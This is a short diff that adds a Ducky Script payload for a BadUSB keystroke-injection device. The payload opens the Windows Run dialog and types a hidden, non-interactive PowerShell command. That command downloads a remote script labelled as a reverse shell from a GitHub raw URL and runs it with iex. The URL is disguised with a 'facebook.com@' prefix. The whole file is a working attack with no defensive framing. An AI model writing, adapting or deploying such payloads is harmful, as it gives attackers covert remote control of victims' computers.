@@ -1,0 +1,4 @@
+GUI r
+DELAY 1500
+STRING powershell -W hidden -noni -nop -c "iwr 'https://facebook.com@raw.githubusercontent.com/CharlesTheGreat77/BADUSB/main/ReverseShell/shelly.txt').Content | iex"
+ENTER
